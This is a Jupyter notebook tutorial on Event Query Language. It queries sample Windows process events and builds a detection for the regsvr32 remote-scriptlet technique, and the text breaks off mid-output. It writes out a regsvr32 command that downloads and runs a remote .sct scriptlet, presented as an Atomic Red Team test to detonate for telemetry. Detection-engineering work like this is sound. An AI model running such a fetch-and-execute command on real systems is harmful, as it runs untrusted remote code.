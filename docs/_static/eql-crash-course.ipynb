{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "# Event Query Language\n",
    "\n",
    "Atomic Friday with Endgame 2019/01/11 (updated 2020/01/09)\n",
    "\n",
    "[@eventquerylang](https://twitter.com/eventquerylang)\n",
    "\n",
    "![](https://github.com/endgameinc/eql/raw/master/docs/_static/eql.png)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "## Getting Started\n",
    "https://eql.readthedocs.io/en/latest/index.html#getting-started\n",
    "\n",
    "Requires Python 3\n",
    "\n",
    "```console\n",
    "Collecting eql\n",
    "  Downloading https://files.pythonhosted.org/packages/7d/a4/ac5560153f2ee4ed967250198c9cc39e6d6ad938db0ff8600dcb4716598e/eql-0.8.1-py2.py3-none-any.whl (96kB)\n",
    "     |████████████████████████████████| 102kB 457kB/s\n",
    "Collecting lark-parser~=0.7 (from eql)\n",
    "  Downloading https://files.pythonhosted.org/packages/34/b8/aa7d6cf2d5efdd2fcd85cf39b33584fe12a0f7086ed451176ceb7fb510eb/lark-parser-0.7.8.tar.gz (276kB)\n",
    "     |████████████████████████████████| 276kB 669kB/s\n",
    "Building wheels for collected packages: lark-parser\n",
    "  Building wheel for lark-parser (setup.py) ... done\n",
    "  Created wheel for lark-parser: filename=lark_parser-0.7.8-py2.py3-none-any.whl size=62516 sha256=0d431f442b57b113b6afa1d638a86a5c06f6f0d5b112fb3af117ff335e6c6fb7\n",
    "  Stored in directory: /private/var/folders/_v/l0j01qy91mbdb7z2yf4jxny40000gq/T/pip-ephem-wheel-cache-hjzs7nda/wheels/01/a2/30/ebae6ffa73cf3aa1c972a24d4c78388afd910f91e43bf554aa\n",
    "Successfully built lark-parser\n",
    "Installing collected packages: lark-parser, eql\n",
    "  Found existing installation: lark-parser 0.7.8\n",
    "    Uninstalling lark-parser-0.7.8:\n",
    "      Successfully uninstalled lark-parser-0.7.8\n",
    "  Found existing installation: eql 0.8.0\n",
    "    Uninstalling eql-0.8.0:\n",
    "      Successfully uninstalled eql-0.8.0\n",
    "Successfully installed eql-0.8.1 lark-parser-0.7.8\n",
    "```\n",
    "\n",
    "Read more [next steps](https://eql.readthedocs.io/en/latest/query-guide/basic-syntax.html) to get running and see the [guide](https://eql.readthedocs.io/en/latest/query-guide/basic-syntax.html) for writing queries"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "```console\n",
    "$ eql query -f data/example.json \"process where process_name = 'explorer.exe'\" | jq .\n",
    "```\n",
    "```json\n",
    "{\n",
    "  \"command_line\": \"C:\\\\Windows\\\\Explorer.EXE\",\n",
    "  \"event_type\": \"process\",\n",
    "  \"md5\": \"ac4c51eb24aa95b77f705ab159189e24\",\n",
    "  \"pid\": 2460,\n",
    "  \"ppid\": 3052,\n",
    "  \"process_name\": \"explorer.exe\",\n",
    "  \"process_path\": \"C:\\\\Windows\\\\explorer.exe\",\n",
    "  \"subtype\": \"create\",\n",
    "  \"timestamp\": 131485997150000000,\n",
    "  \"user\": \"research\\\\researcher\",\n",
    "  \"user_domain\": \"research\",\n",
    "  \"user_name\": \"researcher\"\n",
    "}\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "# EQL works great in the command line with the command-line utility \"eql query\" and JSON output,\n",
    "# but this is one way to hook it up to a jupyter notebook for showing results as tables\n",
    "\n",
    "from pandas import DataFrame\n",
    "from eql.build import get_engine\n",
    "from eql.utils import stream_file_events\n",
    "import numpy\n",
    "\n",
    "\n",
    "def eql_search(path, query_text, config=None):\n",
    "    \"\"\"Run an EQL query over a stream of events and get a dataframe back.\"\"\"\n",
    "    config = config or {}\n",
    "    config.setdefault('flatten', True)\n",
    "    engine = get_engine(query_text, config)\n",
    "    event_stream = stream_file_events(path)\n",
    "    rows = [result.data for result in engine(event_stream)]\n",
    "    frame = DataFrame(rows)\n",
    "    return frame.replace(numpy.nan, '', regex=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "# Getting familiar with data\n",
    "\n",
    "Let's start with our sample [`example.json`](https://eql.readthedocs.io/en/latest/_downloads/example.json) data, to see what's available."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>command_line</th>\n",
       "      <th>event_type</th>\n",
       "      <th>md5</th>\n",
       "      <th>parent_process_name</th>\n",
       "      <th>parent_process_path</th>\n",
       "      <th>pid</th>\n",
       "      <th>ppid</th>\n",
       "      <th>process_name</th>\n",
       "      <th>process_path</th>\n",
       "      <th>subtype</th>\n",
       "      <th>timestamp</th>\n",
       "      <th>user</th>\n",
       "      <th>user_domain</th>\n",
       "      <th>user_name</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td></td>\n",
       "      <td>process</td>\n",
       "      <td></td>\n",
       "      <td>System Idle Process</td>\n",
       "      <td></td>\n",
       "      <td>4</td>\n",
       "      <td></td>\n",
       "      <td>System</td>\n",
       "      <td></td>\n",
       "      <td>create</td>\n",
       "      <td>131485996510000000</td>\n",
       "      <td>NT AUTHORITY\\SYSTEM</td>\n",
       "      <td>NT AUTHORITY</td>\n",
       "      <td>SYSTEM</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>wininit.exe</td>\n",
       "      <td>process</td>\n",
       "      <td>94355c28c1970635a31b3fe52eb7ceba</td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td>424</td>\n",
       "      <td>364</td>\n",
       "      <td>wininit.exe</td>\n",
       "      <td>C:\\Windows\\System32\\wininit.exe</td>\n",
       "      <td>create</td>\n",
       "      <td>131485996510000000</td>\n",
       "      <td>NT AUTHORITY\\SYSTEM</td>\n",
       "      <td>NT AUTHORITY</td>\n",
       "      <td>SYSTEM</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>winlogon.exe</td>\n",
       "      <td>process</td>\n",
       "      <td>1151b1baa6f350b1db6598e0fea7c457</td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td>472</td>\n",
       "      <td>416</td>\n",
       "      <td>winlogon.exe</td>\n",
       "      <td>C:\\Windows\\System32\\winlogon.exe</td>\n",
       "      <td>create</td>\n",
       "      <td>131485996510000000</td>\n",
       "      <td>NT AUTHORITY\\SYSTEM</td>\n",
       "      <td>NT AUTHORITY</td>\n",
       "      <td>SYSTEM</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>C:\\Windows\\system32\\services.exe</td>\n",
       "      <td>process</td>\n",
       "      <td>24acb7e5be595468e3b9aa488b9b4fcb</td>\n",
       "      <td>wininit.exe</td>\n",
       "      <td>C:\\Windows\\System32\\wininit.exe</td>\n",
       "      <td>524</td>\n",
       "      <td>424</td>\n",
       "      <td>services.exe</td>\n",
       "      <td>C:\\Windows\\System32\\services.exe</td>\n",
       "      <td>create</td>\n",
       "      <td>131485996520000000</td>\n",
       "      <td>NT AUTHORITY\\SYSTEM</td>\n",
       "      <td>NT AUTHORITY</td>\n",
       "      <td>SYSTEM</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>C:\\Windows\\system32\\lsass.exe</td>\n",
       "      <td>process</td>\n",
       "      <td>7554a1b82b4a222fd4cc292abd38a558</td>\n",
       "      <td>wininit.exe</td>\n",
       "      <td>C:\\Windows\\System32\\wininit.exe</td>\n",
       "      <td>536</td>\n",
       "      <td>424</td>\n",
       "      <td>lsass.exe</td>\n",
       "      <td>C:\\Windows\\System32\\lsass.exe</td>\n",
       "      <td>create</td>\n",
       "      <td>131485996520000000</td>\n",
       "      <td>NT AUTHORITY\\SYSTEM</td>\n",
       "      <td>NT AUTHORITY</td>\n",
       "      <td>SYSTEM</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>C:\\Windows\\Explorer.EXE</td>\n",
       "      <td>process</td>\n",
       "      <td>ac4c51eb24aa95b77f705ab159189e24</td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td>2460</td>\n",
       "      <td>3052</td>\n",
       "      <td>explorer.exe</td>\n",
       "      <td>C:\\Windows\\explorer.exe</td>\n",
       "      <td>create</td>\n",
       "      <td>131485997150000000</td>\n",
       "      <td>research\\researcher</td>\n",
       "      <td>research</td>\n",
       "      <td>researcher</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>\"C:\\Windows\\system32\\cmd.exe\"</td>\n",
       "      <td>process</td>\n",
       "      <td>5746bd7e255dd6a8afa06f7c42c1ba41</td>\n",
       "      <td>explorer.exe</td>\n",
       "      <td>C:\\Windows\\explorer.exe</td>\n",
       "      <td>2864</td>\n",
       "      <td>2460</td>\n",
       "      <td>cmd.exe</td>\n",
       "      <td>C:\\Windows\\System32\\cmd.exe</td>\n",
       "      <td>create</td>\n",
       "      <td>131491838190000000</td>\n",
       "      <td>research\\researcher</td>\n",
       "      <td>research</td>\n",
       "      <td>researcher</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                       command_line event_type  \\\n",
       "0                                      process   \n",
       "1                       wininit.exe    process   \n",
       "2                      winlogon.exe    process   \n",
       "3  C:\\Windows\\system32\\services.exe    process   \n",
       "4     C:\\Windows\\system32\\lsass.exe    process   \n",
       "5           C:\\Windows\\Explorer.EXE    process   \n",
       "6    \"C:\\Windows\\system32\\cmd.exe\"     process   \n",
       "\n",
       "                                md5  parent_process_name  \\\n",
       "0                                    System Idle Process   \n",
       "1  94355c28c1970635a31b3fe52eb7ceba                        \n",
       "2  1151b1baa6f350b1db6598e0fea7c457                        \n",
       "3  24acb7e5be595468e3b9aa488b9b4fcb          wininit.exe   \n",
       "4  7554a1b82b4a222fd4cc292abd38a558          wininit.exe   \n",
       "5  ac4c51eb24aa95b77f705ab159189e24                        \n",
       "6  5746bd7e255dd6a8afa06f7c42c1ba41         explorer.exe   \n",
       "\n",
       "               parent_process_path   pid  ppid  process_name  \\\n",
       "0                                      4              System   \n",
       "1                                    424   364   wininit.exe   \n",
       "2                                    472   416  winlogon.exe   \n",
       "3  C:\\Windows\\System32\\wininit.exe   524   424  services.exe   \n",
       "4  C:\\Windows\\System32\\wininit.exe   536   424     lsass.exe   \n",
       "5                                   2460  3052  explorer.exe   \n",
       "6          C:\\Windows\\explorer.exe  2864  2460       cmd.exe   \n",
       "\n",
       "                       process_path subtype           timestamp  \\\n",
       "0                                    create  131485996510000000   \n",
       "1   C:\\Windows\\System32\\wininit.exe  create  131485996510000000   \n",
       "2  C:\\Windows\\System32\\winlogon.exe  create  131485996510000000   \n",
       "3  C:\\Windows\\System32\\services.exe  create  131485996520000000   \n",
       "4     C:\\Windows\\System32\\lsass.exe  create  131485996520000000   \n",
       "5           C:\\Windows\\explorer.exe  create  131485997150000000   \n",
       "6       C:\\Windows\\System32\\cmd.exe  create  131491838190000000   \n",
       "\n",
       "                  user   user_domain   user_name  \n",
       "0  NT AUTHORITY\\SYSTEM  NT AUTHORITY      SYSTEM  \n",
       "1  NT AUTHORITY\\SYSTEM  NT AUTHORITY      SYSTEM  \n",
       "2  NT AUTHORITY\\SYSTEM  NT AUTHORITY      SYSTEM  \n",
       "3  NT AUTHORITY\\SYSTEM  NT AUTHORITY      SYSTEM  \n",
       "4  NT AUTHORITY\\SYSTEM  NT AUTHORITY      SYSTEM  \n",
       "5  research\\researcher      research  researcher  \n",
       "6  research\\researcher      research  researcher  "
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# eql query -f data/example.json \"any where true\"\n",
    "eql_search(\"data/example.json\", \"any where true\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "Great! Now with that data in mind, let's test out some EQL queries to become familiar with the syntax.\n",
    "\n",
    "Is there a process event for `explorer.exe`?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>command_line</th>\n",
       "      <th>event_type</th>\n",
       "      <th>md5</th>\n",
       "      <th>pid</th>\n",
       "      <th>ppid</th>\n",
       "      <th>process_name</th>\n",
       "      <th>process_path</th>\n",
       "      <th>subtype</th>\n",
       "      <th>timestamp</th>\n",
       "      <th>user</th>\n",
       "      <th>user_domain</th>\n",
       "      <th>user_name</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>C:\\Windows\\Explorer.EXE</td>\n",
       "      <td>process</td>\n",
       "      <td>ac4c51eb24aa95b77f705ab159189e24</td>\n",
       "      <td>2460</td>\n",
       "      <td>3052</td>\n",
       "      <td>explorer.exe</td>\n",
       "      <td>C:\\Windows\\explorer.exe</td>\n",
       "      <td>create</td>\n",
       "      <td>131485997150000000</td>\n",
       "      <td>research\\researcher</td>\n",
       "      <td>research</td>\n",
       "      <td>researcher</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "              command_line event_type                               md5   pid  \\\n",
       "0  C:\\Windows\\Explorer.EXE    process  ac4c51eb24aa95b77f705ab159189e24  2460   \n",
       "\n",
       "   ppid  process_name             process_path subtype           timestamp  \\\n",
       "0  3052  explorer.exe  C:\\Windows\\explorer.exe  create  131485997150000000   \n",
       "\n",
       "                  user user_domain   user_name  \n",
       "0  research\\researcher    research  researcher  "
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# eql query -f data/example.json \"process where process_name='explorer.exe'\"\n",
    "results = eql_search(\"data/example.json\",\n",
    "                     \"process where process_name='explorer.exe'\")\n",
    "results"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "Let's use jupyter and pandas to show us only a few columns.\n",
    "We'll just take the results we already saved and format them differently."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "slideshow": {
     "slide_type": "-"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>timestamp</th>\n",
       "      <th>user_name</th>\n",
       "      <th>command_line</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>131485997150000000</td>\n",
       "      <td>researcher</td>\n",
       "      <td>C:\\Windows\\Explorer.EXE</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "            timestamp   user_name             command_line\n",
       "0  131485997150000000  researcher  C:\\Windows\\Explorer.EXE"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "results[['timestamp', 'user_name', 'command_line']]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "What are the parent-child process relationships in this data set?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>count</th>\n",
       "      <th>key</th>\n",
       "      <th>percent</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>1</td>\n",
       "      <td>(System Idle Process, System)</td>\n",
       "      <td>0.25</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>1</td>\n",
       "      <td>(explorer.exe, cmd.exe)</td>\n",
       "      <td>0.25</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>1</td>\n",
       "      <td>(wininit.exe, lsass.exe)</td>\n",
       "      <td>0.25</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>1</td>\n",
       "      <td>(wininit.exe, services.exe)</td>\n",
       "      <td>0.25</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "   count                            key  percent\n",
       "0      1  (System Idle Process, System)     0.25\n",
       "1      1        (explorer.exe, cmd.exe)     0.25\n",
       "2      1       (wininit.exe, lsass.exe)     0.25\n",
       "3      1    (wininit.exe, services.exe)     0.25"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "eql_search(\"data/example.json\", \"parent_process_name != null| count parent_process_name, process_name\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "### Time for some more interesting data.\n",
    "Let's generate some data using Sysmon, following our [guide](https://eqllib.readthedocs.io/en/latest/guides/sysmon.html)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "Pick a MITRE ATT&CK™ technique and detonate one of the Atomic Tests [T1117 Regsvr32](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1117/T1117.md#atomic-test-2---regsvr32-remote-com-scriptlet-execution) that we can find in Sysmon logs.\n",
    "\n",
    "\n",
    "```console\n",
    "$ regsvr32.exe /s /u /i https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "Then, within PowerShell, load the [scrape.ps1](https://github.com/endgameinc/eqllib/blob/master/utils/scrape-events.ps1) script that can convert Sysmon events into JSON that's compatible with EQL.\n",
    "\n",
    "```powershell\n",
    "# Import the functions provided within scrape-events\n",
    "Import-Module .\\utils\\scrape-events.ps1\n",
    "\n",
    "# Save the most recent 5000 Sysmon logs\n",
    "Get-LatestLogs  | ConvertTo-Json | Out-File -Encoding ASCII -FilePath my-sysmon-data.json\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "We have several examples in [Github](https://github.com/endgameinc/eqllib/tree/master/data)\n",
    "\n",
    "- normalized-T1117-AtomicRed-regsvr32.json\n",
    "- normalized-atomic-red-team.json.gz\n",
    "- normalized-rta.json.gz\n",
    "- sysmon-atomic-red-team.json.gz\n",
    "- sysmon-rta.json.gz"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "Pick T1117 since it already matches what we just detonated.\n",
    "Grab the log file from https://raw.githubusercontent.com/endgameinc/eqllib/master/data/normalized-T1117-AtomicRed-regsvr32.json\n",
    "\n",
    "_How do we turn this into a detection?_"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>count</th>\n",
       "      <th>key</th>\n",
       "      <th>percent</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>1</td>\n",
       "      <td>network</td>\n",
       "      <td>0.006667</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>4</td>\n",
       "      <td>process</td>\n",
       "      <td>0.026667</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>56</td>\n",
       "      <td>registry</td>\n",
       "      <td>0.373333</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>89</td>\n",
       "      <td>image_load</td>\n",
       "      <td>0.593333</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "   count         key   percent\n",
       "0      1     network  0.006667\n",
       "1      4     process  0.026667\n",
       "2     56    registry  0.373333\n",
       "3     89  image_load  0.593333"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "eql_search('data/normalized-T1117-AtomicRed-regsvr32.json',\n",
    "           \"| count event_type\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>count</th>\n",
       "      <th>key</th>\n",
       "      <th>percent</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>1</td>\n",
       "      <td>(regsvr32.exe, network)</td>\n",
       "      <td>0.006667</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>2</td>\n",
       "      <td>(cmd.exe, process)</td>\n",
       "      <td>0.013333</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>2</td>\n",
       "      <td>(regsvr32.exe, process)</td>\n",
       "      <td>0.013333</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>5</td>\n",
       "      <td>(cmd.exe, image_load)</td>\n",
       "      <td>0.033333</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>56</td>\n",
       "      <td>(regsvr32.exe, registry)</td>\n",
       "      <td>0.373333</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>84</td>\n",
       "      <td>(regsvr32.exe, image_load)</td>\n",
       "      <td>0.560000</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "   count                         key   percent\n",
       "0      1     (regsvr32.exe, network)  0.006667\n",
       "1      2          (cmd.exe, process)  0.013333\n",
       "2      2     (regsvr32.exe, process)  0.013333\n",
       "3      5       (cmd.exe, image_load)  0.033333\n",
       "4     56    (regsvr32.exe, registry)  0.373333\n",
       "5     84  (regsvr32.exe, image_load)  0.560000"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "eql_search('data/normalized-T1117-AtomicRed-regsvr32.json',\n",
    "           \"| count process_name,event_type\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>command_line</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>regsvr32.exe  /s /u /i:https://raw.githubuserc...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                        command_line\n",
       "0  regsvr32.exe  /s /u /i:https://raw.githubuserc..."
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "results = eql_search(\"data/normalized-T1117-AtomicRed-regsvr32.json\",\n",
    "                     \"process where subtype='create' and process_name = 'regsvr32.exe'\")\n",
    "results[['command_line']]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "```javascript\n",
    "{\n",
    "  \"command_line\": \"regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll\",\n",
    "  \"event_type\": \"process\",\n",
    "  // ...\n",
    "  \"user\": \"ART-DESKTOP\\\\bob\",\n",
    "  \"user_domain\": \"ART-DESKTOP\",\n",
    "  \"user_name\": \"bob\"\n",
    "}\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>event_type</th>\n",
       "      <th>image_name</th>\n",
       "      <th>image_path</th>\n",
       "      <th>pid</th>\n",
       "      <th>process_name</th>\n",
       "      <th>process_path</th>\n",
       "      <th>timestamp</th>\n",
       "      <th>unique_pid</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>image_load</td>\n",
       "      <td>scrobj.dll</td>\n",
       "      <td>C:\\Windows\\System32\\scrobj.dll</td>\n",
       "      <td>2012</td>\n",
       "      <td>regsvr32.exe</td>\n",
       "      <td>C:\\Windows\\System32\\regsvr32.exe</td>\n",
       "      <td>131883573237450016</td>\n",
       "      <td>{42FC7E13-CBCB-5C05-0000-0010A0395401}</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "   event_type  image_name                      image_path   pid  process_name  \\\n",
       "0  image_load  scrobj.dll  C:\\Windows\\System32\\scrobj.dll  2012  regsvr32.exe   \n",
       "\n",
       "                       process_path           timestamp  \\\n",
       "0  C:\\Windows\\System32\\regsvr32.exe  131883573237450016   \n",
       "\n",
       "                               unique_pid  \n",
